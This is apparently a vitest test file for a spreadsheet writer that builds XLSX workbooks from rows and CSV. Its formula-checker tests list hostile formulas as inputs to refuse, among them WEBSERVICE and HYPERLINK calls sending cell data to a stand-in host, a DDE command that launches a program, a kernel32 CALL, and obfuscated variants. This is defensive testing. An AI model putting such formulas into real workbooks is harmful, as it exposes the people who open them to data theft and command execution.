import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import {
  FormulaError, MAX_CELL_CHARS, checkFormula, columnName, csvCells, parseCsv, rowsToXlsx, sheetNames, xlsxFeatures,
  type CellValue,
} from "../../src/content/xlsx-write";
import { attribute, childElements, firstChild, parseXml, textContent, type XmlElement } from "../../src/content/xml";
import { openZip } from "../../src/content/zip";
import { buildZip } from "./test-fixtures";

const MAIN = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";
const NAMESPACES = {
  [MAIN]: "s",
  "http://schemas.openxmlformats.org/officeDocument/2006/relationships": "r",
  "http://schemas.openxmlformats.org/package/2006/relationships": "pr",
  "http://schemas.openxmlformats.org/package/2006/content-types": "ct",
  "http://schemas.openxmlformats.org/package/2006/metadata/core-properties": "cp",
  "http://purl.org/dc/elements/1.1/": "dc",
};

/** An unpacked workbook, every part parsed. */
async function unpack(bytes: Uint8Array) {
  const zip = openZip(bytes);
  const parts = new Map<string, XmlElement>();
  for (const entry of zip.entries()) parts.set(entry.name, parseXml(await zip.readText(entry.name), { namespaces: NAMESPACES }));
  const part = (name: string) => {
    const found = parts.get(name);
    if (!found) throw new Error(`missing ${name}`);
    return found;
  };
  const strings = childElements(part("xl/sharedStrings.xml"), "s:si").map(si => textContent(si));
  const sheet = (index = 1) => {
    const root = part(`xl/worksheets/sheet${index}.xml`);
    const cells = new Map<string, { type?: string; style?: string; value?: string; formula?: string; text?: string; element: XmlElement }>();
    for (const row of childElements(firstChild(root, "s:sheetData"), "s:row")) {
      for (const c of childElements(row, "s:c")) {
        const type = attribute(c, "t");
        const v = firstChild(c, "s:v");
        const f = firstChild(c, "s:f");
        const value = v ? textContent(v) : undefined;
        cells.set(attribute(c, "r")!, {
          element: c,
          ...(type ? { type } : {}),
          ...(attribute(c, "s") ? { style: attribute(c, "s") } : {}),
          ...(value !== undefined ? { value } : {}),
          ...(f ? { formula: textContent(f) } : {}),
          ...(type === "s" && value !== undefined ? { text: strings[Number(value)] } : {}),
        });
      }
    }
    return { root, cells };
  };
  return { zip, parts, part, strings, sheet };
}

describe("parseCsv", () => {
  it("reads quoted fields, doubled quotes, embedded delimiters and line breaks", () => {
    expect(parseCsv("a,\"b,c\",\"say \"\"hi\"\"\"\n\"multi\nline\",x,")).toEqual([
      ["a", "b,c", "say \"hi\""],
      ["multi\nline", "x", ""],
    ]);
  });

  it("accepts CRLF and LF, ignores a BOM and one trailing line end, and keeps empty rows inside", () => {
    expect(parseCsv("\ufeffa,b\r\n1,2\r\n\r\n3,4\r\n")).toEqual([["a", "b"], ["1", "2"], [""], ["3", "4"]]);
    expect(parseCsv("")).toEqual([]);
    expect(parseCsv("x")).toEqual([["x"]]);
  });

  it("reads text copied out of Excel as tab-separated", () => {
    expect(parseCsv("Name\tAmount, USD\nRent\t1200")).toEqual([["Name\tAmount", " USD"], ["Rent\t1200"]]);
    expect(parseCsv("Name\tAmount\nRent\t1,200")).toEqual([["Name", "Amount"], ["Rent", "1,200"]]);
    expect(parseCsv("\"a,b\"\tc")).toEqual([["a,b", "c"]]);
  });

  it("keeps a quote that isn't at a field's start as text", () => {
    expect(parseCsv("5\" screen,ok")).toEqual([["5\" screen", "ok"]]);
  });
});

describe("csvCells", () => {
  it("stores numbers as numbers only when nothing is lost", () => {
    expect(csvCells([["42", "-3.5", "0.25", "0", "1.50"]])).toEqual([[42, -3.5, 0.25, 0, 1.5]]);
    expect(csvCells([["02134", "1e5", "1,234", "$5", "5%", "1234567890123456", " 42", "-0", ".5"]]))
      .toEqual([["02134", "1e5", "1,234", "$5", "5%", "1234567890123456", " 42", 0, ".5"]]);
    expect(csvCells([["123456789012345"]])).toEqual([[123456789012345]]);
  });

  it("reads booleans in any case, empty as empty, and leaves formulas as text", () => {
    expect(csvCells([["TRUE", "false", "", "=SUM(A1:A2)", "Yes"]])).toEqual([[true, false, null, "=SUM(A1:A2)", "Yes"]]);
  });
});

describe("checkFormula", () => {
  it("allows the functions people use", () => {
    for (const formula of [
      "=SUM(A1:A10)", "=VLOOKUP(A2,Sheet2!A:B,2,FALSE)", "=XLOOKUP(A2,B:B,C:C)", "=LET(x,A1*2,x+1)",
      "=LAMBDA(x,x*2)(3)", "=IF(A1>0,\"yes\",\"no\")", "=SUMIFS(Costs[Q1],Costs[Item],\"Rent\")", "=CELL(\"address\",A1)",
      "='My Sheet'!A1+1", "=TEXTJOIN(\", \",TRUE,A1:A3)", "SUM(1,2)", "=[@Q1]*2", "=Costs[[#Totals],[Q1]]",
    ]) expect(() => checkFormula(formula), formula).not.toThrow();
  });

  it("refuses functions that reach outside the workbook, run code, or read the opener's environment", () => {
    for (const [formula, name] of [
      ["=WEBSERVICE(\"https://x.test/?d=\"&A1)", "WEBSERVICE"], ["=webservice(A1)", "WEBSERVICE"],
      ["=FILTERXML(A1,\"//x\")", "FILTERXML"], ["=IMAGE(\"https://x.test/a.png\")", "IMAGE"], ["=RTD(\"x\",,\"y\")", "RTD"],
      ["=CALL(\"kernel32\",\"x\")", "CALL"], ["=REGISTER.ID(\"x\",\"y\")", "REGISTER.ID"], ["=HYPERLINK(\"https://x.test/\"&A1)", "HYPERLINK"],
      ["=INFO(\"directory\")", "INFO"], ["=_xlfn.STOCKHISTORY(\"MSFT\",TODAY())", "STOCKHISTORY"], ["=SUM(1,IF(A1,WEBSERVICE(B1),0))", "WEBSERVICE"],
      ["=_xlfn.PY(\"import os\")", "PY"],
    ]) expect(() => checkFormula(formula!), formula).toThrow(new RegExp(`uses ${name!.replace(".", "\\.")}`));
  });

  it("refuses a function passed by name, and a name split by a character the file would drop", () => {
    expect(() => checkFormula("=MAP(A1:A3, _xleta.WEBSERVICE)")).toThrow(/uses WEBSERVICE/);
    expect(() => checkFormula("=_xleta.IMAGE")).toThrow(/uses IMAGE/);
    expect(() => checkFormula("=BYROW(A1:B2, _xleta._xlfn.PY)")).toThrow(/uses PY/);
    expect(() => checkFormula("=LET(f, LAMBDA(x, x+1), f(2))")).not.toThrow();
    expect(() => checkFormula("=MAP(A1:A3, _xleta.SQRT)")).not.toThrow();
    // XML can't hold U+0001, so writing would drop it and the file would say WEBSERVICE.
    expect(() => checkFormula("=WEB\u0001SERVICE(\"https://x.test\")")).toThrow(/control character/);
    expect(() => checkFormula("=WEB\ufffeSERVICE(\"https://x.test\")")).toThrow(/control character/);
    expect(() => checkFormula("=WEB\ud800SERVICE(\"https://x.test\")")).toThrow(/control character/);
    expect(() => checkFormula("=\"tab\there\"&\"\ud83d\ude00\"")).not.toThrow();
  });

  it("refuses CELL(\"filename\") and a computed CELL info type", () => {
    expect(() => checkFormula("=CELL(\"filename\")")).toThrow(/reports where the file is saved/);
    expect(() => checkFormula("=CELL(\"FileName\",A1)")).toThrow(FormulaError);
    expect(() => checkFormula("=CELL(B1,A1)")).toThrow(/isn't written out/);
  });

  it("refuses links to other workbooks and DDE", () => {
    expect(() => checkFormula("=[Budget.xlsx]Sheet1!A1")).toThrow(/another workbook/);
    expect(() => checkFormula("=[1]Sheet1!A1")).toThrow(/another workbook/);
    expect(() => checkFormula("='C:\\Finance\\[Budget.xlsx]Sheet1'!A1")).toThrow(/another workbook/);
    expect(() => checkFormula("='https://contoso.sharepoint.com/[a.xlsx]S'!A1")).toThrow(/another workbook/);
    expect(() => checkFormula("=cmd|' /c calc'!A0")).toThrow(/DDE/);
  });

  it("never mistakes text in a string for a call or a link", () => {
    expect(() => checkFormula("=\"WEBSERVICE(\"&\"x\"")).not.toThrow();
    expect(() => checkFormula("=\"a|b\"&\"[Book.xlsx]Sheet!A1\"")).not.toThrow();
    expect(() => checkFormula("=CONCAT(\"call HYPERLINK(\", A1)")).not.toThrow();
  });

  it("refuses malformed and oversized formulas", () => {
    expect(() => checkFormula("=")).toThrow(/empty/);
    expect(() => checkFormula("=\"open")).toThrow(/unclosed/);
    expect(() => checkFormula(`=${"1+".repeat(5000)}1`)).toThrow(/at most 8,192/);
  });
});

describe("sheetNames and columnName", () => {
  it("cleans names to what Excel accepts and keeps them unique", () => {
    expect(sheetNames(["Q1/Q2: [draft]*", "history", undefined, "Budget", "budget", "'quoted'", "x".repeat(40)])).toEqual([
      "Q1 Q2 draft", "history 1", "Sheet3", "Budget", "budget (2)", "quoted", "x".repeat(31),
    ]);
    const long = sheetNames(["a".repeat(31), "a".repeat(31)]);
    expect(long[1]).toBe(`${"a".repeat(27)} (2)`);
    expect(sheetNames(["😀".repeat(20)])[0]!.length).toBeLessThanOrEqual(31);
    expect(sheetNames(["😀".repeat(20)])[0]).not.toMatch(/[\ud800-\udbff]$/);
  });

  it("names columns A to XFD", () => {
    expect([0, 25, 26, 27, 701, 702, 16_383].map(columnName)).toEqual(["A", "Z", "AA", "AB", "ZZ", "AAA", "XFD"]);
  });
});

describe("rowsToXlsx", () => {
  const budget: CellValue[][] = [
    ["Item", "Q1", "Q2", "Total", "Approved"],
    ["Rent", 1200, 1250, "=SUM(B2:C2)", true],
    ["Travel", 300.5, 410.25, "=SUM(B3:C3)", false],
    ["Software", 99, null, "=B4", null],
  ];

  it("writes a package whose parts all parse, with matching content types and relationships", async () => {
    const book = await unpack(await rowsToXlsx(budget, { title: "FY27 budget", author: "Phillip Jones", modifiedAt: new Date("2026-10-17T12:00:00Z") }));
    const overrides = childElements(book.part("[Content_Types].xml"), "ct:Override").map(element => attribute(element, "PartName"));
    for (const name of book.parts.keys()) {
      if (name.endsWith(".rels") || name === "[Content_Types].xml") continue;
      expect(overrides, name).toContain(`/${name}`);
    }
    const rels = childElements(book.part("xl/_rels/workbook.xml.rels"), "pr:Relationship").map(element => `xl/${attribute(element, "Target")}`);
    for (const target of rels) expect(book.parts.has(target), target).toBe(true);
    const rootRels = childElements(book.part("_rels/.rels"), "pr:Relationship").map(element => attribute(element, "Target")!);
    for (const target of rootRels) expect(book.parts.has(target), target).toBe(true);
    expect(textContent(firstChild(book.part("docProps/core.xml"), "dc:title")!)).toBe("FY27 budget");
    expect(textContent(firstChild(book.part("docProps/core.xml"), "dc:creator")!)).toBe("Phillip Jones");
  });

  it("stores each kind of value the way Excel does", async () => {
    const { cells } = (await unpack(await rowsToXlsx(budget))).sheet();
    expect(cells.get("A2")).toMatchObject({ type: "s", text: "Rent" });
    expect(cells.get("B2")).toMatchObject({ value: "1200" });
    expect(cells.get("B2")!.type).toBeUndefined();
    expect(cells.get("E2")).toMatchObject({ type: "b", value: "1" });
    expect(cells.get("E3")).toMatchObject({ type: "b", value: "0" });
    expect(cells.get("D2")).toMatchObject({ formula: "SUM(B2:C2)" });
    expect(cells.get("D2")!.value).toBeUndefined();
    expect(cells.has("C4")).toBe(false);
  });

  it("makes the header bold, frozen and filterable, with the hidden filter range Excel expects", async () => {
    const book = await unpack(await rowsToXlsx(budget));
    const { root, cells } = book.sheet();
    for (const ref of ["A1", "B1", "E1"]) expect(cells.get(ref)!.style).toBe("1");
    const pane = firstChild(firstChild(firstChild(root, "s:sheetViews"), "s:sheetView"), "s:pane")!;
    expect(attribute(pane, "state")).toBe("frozen");
    expect(attribute(pane, "ySplit")).toBe("1");
    expect(attribute(firstChild(root, "s:autoFilter"), "ref")).toBe("A1:E4");
    expect(attribute(firstChild(root, "s:dimension"), "ref")).toBe("A1:E4");
    const name = firstChild(firstChild(book.part("xl/workbook.xml"), "s:definedNames"), "s:definedName")!;
    expect(attribute(name, "name")).toBe("_xlnm._FilterDatabase");
    expect(attribute(name, "hidden")).toBe("1");
    expect(textContent(name)).toBe("'Sheet1'!$A$1:$E$4");
    // The header font is bold; the style index the header uses exists.
    const styles = book.part("xl/styles.xml");
    const xfs = childElements(firstChild(styles, "s:cellXfs"), "s:xf");
    const headerFont = childElements(firstChild(styles, "s:fonts"), "s:font")[Number(attribute(xfs[1], "fontId"))]!;
    expect(firstChild(headerFont, "s:b")).toBeDefined();
    expect(Number(attribute(firstChild(styles, "s:cellXfs"), "count"))).toBe(xfs.length);
  });

  it("can leave the first row as data", async () => {
    const book = await unpack(await rowsToXlsx([[1, 2], [3, 4]], { headerRow: false }));
    const { root, cells } = book.sheet();
    expect(firstChild(root, "s:autoFilter")).toBeUndefined();
    expect(firstChild(firstChild(firstChild(root, "s:sheetViews"), "s:sheetView"), "s:pane")).toBeUndefined();
    expect(cells.get("A1")!.style).toBeUndefined();
    expect(firstChild(book.part("xl/workbook.xml"), "s:definedNames")).toBeUndefined();
  });

  it("formats a column of two-decimal amounts as money, and leaves integers and other decimals general", async () => {
    const { cells } = (await unpack(await rowsToXlsx([
      ["Amount", "Count", "Rate"], [12.5, 3, 0.125], [7.25, 40, 1], [3, 2026, 0.5],
    ]))).sheet();
    expect(cells.get("A2")!.style).toBe("2");
    expect(cells.get("A4")!.style).toBe("2");
    expect(cells.get("B3")!.style).toBeUndefined();
    expect(cells.get("C2")!.style).toBeUndefined();
  });

  it("shares each distinct string once and counts every use", async () => {
    const book = await unpack(await rowsToXlsx([["a", "b"], ["a", "a"], ["b", "c"]]));
    const sst = book.part("xl/sharedStrings.xml");
    expect(attribute(sst, "count")).toBe("6");
    expect(attribute(sst, "uniqueCount")).toBe("3");
    expect(book.strings).toEqual(["a", "b", "c"]);
  });

  it("keeps unicode, whitespace and line breaks, wraps multi-line cells, and escapes what XML can't carry", async () => {
    const book = await unpack(await rowsToXlsx([
      ["Name"], ["Zoë – 東京 😀"], ["  padded  "], ["line one\nline two"], ["tab\there"], ["bell\u0007"], ["literal _x0041_ text"], ["<b>&amp;</b>"],
    ]));
    expect(book.strings).toContain("Zoë – 東京 😀");
    expect(book.strings).toContain("  padded  ");
    expect(book.strings).toContain("line one\nline two");
    expect(book.strings).toContain("tab\there");
    expect(book.strings).toContain("bell_x0007_");
    expect(book.strings).toContain("literal _x005F_x0041_ text");
    expect(book.strings).toContain("<b>&amp;</b>");
    expect(book.sheet().cells.get("A4")!.style).toBe("3");
  });

  it("writes text that starts with = after an apostrophe as text", async () => {
    const { cells } = (await unpack(await rowsToXlsx([["x"], ["'=not a formula"]]))).sheet();
    expect(cells.get("A2")).toMatchObject({ type: "s", text: "=not a formula" });
  });

  it("fits columns to their content, within bounds, counting wide characters double", async () => {
    const { root } = (await unpack(await rowsToXlsx([["ID", "Description", "東京東京東京"], [1, "x".repeat(200), "a"]]))).sheet();
    const widths = childElements(firstChild(root, "s:cols"), "s:col").map(col => Number(attribute(col, "width")));
    expect(widths[0]).toBeCloseTo(8.43);
    expect(widths[1]).toBe(60);
    expect(widths[2]).toBeGreaterThan(14);
  });

  it("writes newer functions with the prefixes Excel needs, and array functions as dynamic arrays", async () => {
    const book = await unpack(await rowsToXlsx([
      ["A", "B"],
      ["=xlookup(A1,B:B,C:C)", "=filter(A2:A9,B2:B9>0)"],
      ["=LET(total,SUM(A2:A9),total*2)", "=sum(A1:A2)"],
      ["=LAMBDA(x,y,x+y)(1,2)", "=_xlfn.XLOOKUP(1,A:A,B:B)"],
      ["=LET(Sheet2,Sheet2!A1,Sheet2+1)", "1"],
    ]));
    const { cells } = book.sheet();
    expect(cells.get("A2")!.formula).toBe("_xlfn.XLOOKUP(A1,B:B,C:C)");
    expect(cells.get("B2")!.formula).toBe("_xlfn._xlws.FILTER(A2:A9,B2:B9>0)");
    expect(attribute(cells.get("B2")!.element, "cm")).toBe("1");
    expect(attribute(firstChild(cells.get("B2")!.element, "s:f"), "t")).toBe("array");
    expect(attribute(cells.get("A2")!.element, "cm")).toBeUndefined();
    expect(cells.get("A3")!.formula).toBe("_xlfn.LET(_xlpm.total,SUM(A2:A9),_xlpm.total*2)");
    expect(cells.get("B3")!.formula).toBe("SUM(A1:A2)");
    expect(cells.get("A4")!.formula).toBe("_xlfn.LAMBDA(_xlpm.x,_xlpm.y,_xlpm.x+_xlpm.y)(1,2)");
    expect(cells.get("B4")!.formula).toBe("_xlfn.XLOOKUP(1,A:A,B:B)");
    // A worksheet qualifier stays the sheet's name, whatever a LET calls its own.
    expect(cells.get("A5")!.formula).toBe("_xlfn.LET(_xlpm.Sheet2,Sheet2!A1,_xlpm.Sheet2+1)");
    expect(book.parts.has("xl/metadata.xml")).toBe(true);
    const types = childElements(book.part("[Content_Types].xml"), "ct:Override").map(element => attribute(element, "PartName"));
    expect(types).toContain("/xl/metadata.xml");
    expect(attribute(firstChild(book.part("xl/workbook.xml"), "s:calcPr"), "fullCalcOnLoad")).toBe("1");
  });

  it("writes no array metadata when nothing spills", async () => {
    expect((await unpack(await rowsToXlsx(budget))).parts.has("xl/metadata.xml")).toBe(false);
  });

  it("names the cell of a refused formula", async () => {
    await expect(rowsToXlsx([["x"], ["=WEBSERVICE(\"https://x.test\")"]])).rejects.toThrow(/Cell A2 of "Sheet1": .*uses WEBSERVICE/);
    await expect(rowsToXlsx([["x"], ["=WEB\u0001SERVICE(\"https://x.test\")"]])).rejects.toThrow(/Cell A2 of "Sheet1": .*control character/);
    await expect(rowsToXlsx([["x"], ["=MAP(A1:A1, _xleta.WEBSERVICE)"]])).rejects.toThrow(/Cell A2 of "Sheet1": .*uses WEBSERVICE/);
  });

  it("writes several sheets, cleaning and de-duplicating their names, and selects the first", async () => {
    const book = await unpack(await rowsToXlsx([
      { name: "Summary", rows: [["Total"], ["=SUM(Detail!B:B)"]] },
      { name: "Detail", rows: [["Item", "Cost"], ["A", 1]] },
      { name: "detail", rows: [] },
    ]));
    const sheets = childElements(firstChild(book.part("xl/workbook.xml"), "s:sheets"), "s:sheet").map(sheet => attribute(sheet, "name"));
    expect(sheets).toEqual(["Summary", "Detail", "detail (2)"]);
    expect(book.parts.has("xl/worksheets/sheet3.xml")).toBe(true);
    const view = (index: number) => firstChild(firstChild(book.sheet(index).root, "s:sheetViews"), "s:sheetView");
    expect(attribute(view(1), "tabSelected")).toBe("1");
    expect(attribute(view(2), "tabSelected")).toBeUndefined();
    expect(attribute(firstChild(book.sheet(3).root, "s:dimension"), "ref")).toBe("A1");
    const names = childElements(firstChild(book.part("xl/workbook.xml"), "s:definedNames"), "s:definedName");
    expect(names.map(name => attribute(name, "localSheetId"))).toEqual(["0", "1"]);
  });

  it("refuses what Excel can't hold", async () => {
    await expect(rowsToXlsx([["x".repeat(MAX_CELL_CHARS + 1)]])).rejects.toThrow(/at most 32,767 characters; A1/);
    await expect(rowsToXlsx([Array.from({ length: 16_385 }, () => 1)])).rejects.toThrow(/at most 16,384 columns/);
    await expect(rowsToXlsx([[Number.NaN]])).rejects.toThrow(/finite number/);
    await expect(rowsToXlsx([[{} as unknown as CellValue]])).rejects.toThrow(/must be text, a number/);
    const many = Array.from({ length: 2_001 }, () => Array.from({ length: 1_000 }, () => null));
    await expect(rowsToXlsx(many)).rejects.toThrow(/at most 2,000,000 cells/);
  });

  it("writes an empty input as one blank sheet", async () => {
    const book = await unpack(await rowsToXlsx([]));
    expect(childElements(firstChild(book.part("xl/workbook.xml"), "s:sheets"), "s:sheet")).toHaveLength(1);
    expect(attribute(firstChild(book.sheet().root, "s:dimension"), "ref")).toBe("A1");
    expect(attribute(book.part("xl/sharedStrings.xml"), "uniqueCount")).toBe("0");
  });

  it("writes a large sheet compactly", async () => {
    const rows: CellValue[][] = [["ID", "Name", "Amount"], ...Array.from({ length: 20_000 }, (_, index) => [index, `Row ${index % 100}`, index * 1.25])];
    const bytes = await rowsToXlsx(rows);
    expect(bytes.byteLength).toBeLessThan(400_000);
    expect((await unpack(bytes)).strings).toHaveLength(103);
  });
});

describe("xlsxFeatures", () => {
  it("finds nothing to lose in a workbook this writer made, besides its formulas", async () => {
    expect(await xlsxFeatures(await rowsToXlsx([["a", "b"], [1, 2.5]]))).toEqual([]);
    expect(await xlsxFeatures(await rowsToXlsx([["a"], ["=1+1"]]))).toEqual(["formulas"]);
    expect(await xlsxFeatures(await rowsToXlsx([{ rows: [["a"]] }, { rows: [["b"]] }, { rows: [["c"]] }]))).toEqual(["2 other sheets"]);
  });

  it("lists what a workbook made in an Excel-compatible tool has", async () => {
    // __tests__/fixtures/openpyxl-rich.xlsx: made with openpyxl 3.1 (see fixtures/README.md).
    const features = await xlsxFeatures(new Uint8Array(readFileSync(fileURLToPath(new URL("../fixtures/openpyxl-rich.xlsx", import.meta.url).href))));
    for (const feature of ["1 other sheet", "formulas", "charts", "tables", "conditional formatting", "data validation", "comments",
      "merged cells", "hyperlinks", "named ranges", "cell formatting"]) expect(features, feature).toContain(feature);
    expect(features).not.toContain("macros");
    expect(features).not.toContain("pivot tables");
  });

  it("notices macros, images, pivot tables and links to other workbooks", async () => {
    const workbook = `<workbook xmlns="${MAIN}"><sheets><sheet name="A" sheetId="1"/></sheets></workbook>`;
    const bytes = await buildZip([
      { name: "xl/workbook.xml", data: workbook },
      { name: "xl/worksheets/sheet1.xml", data: `<worksheet xmlns="${MAIN}"><sheetData/></worksheet>` },
      { name: "xl/vbaProject.bin", data: "x" },
      { name: "xl/media/image1.png", data: "x" },
      { name: "xl/pivotTables/pivotTable1.xml", data: "<x/>" },
      { name: "xl/externalLinks/externalLink1.xml", data: "<x/>" },
    ]);
    expect(await xlsxFeatures(bytes)).toEqual(["pivot tables", "images", "macros", "links to other workbooks"]);
  });
});
